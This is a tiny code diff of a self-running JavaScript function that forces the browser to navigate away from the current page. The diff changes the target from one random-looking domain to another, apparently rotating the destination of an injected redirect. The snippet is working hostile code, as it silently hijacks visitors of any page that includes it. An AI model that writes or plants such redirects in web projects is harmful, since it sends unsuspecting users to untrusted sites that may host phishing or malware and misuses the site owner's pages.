@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://kliansme.icu/';
+    window['location'] = 'https://letsclsakr.cn/';
 })();
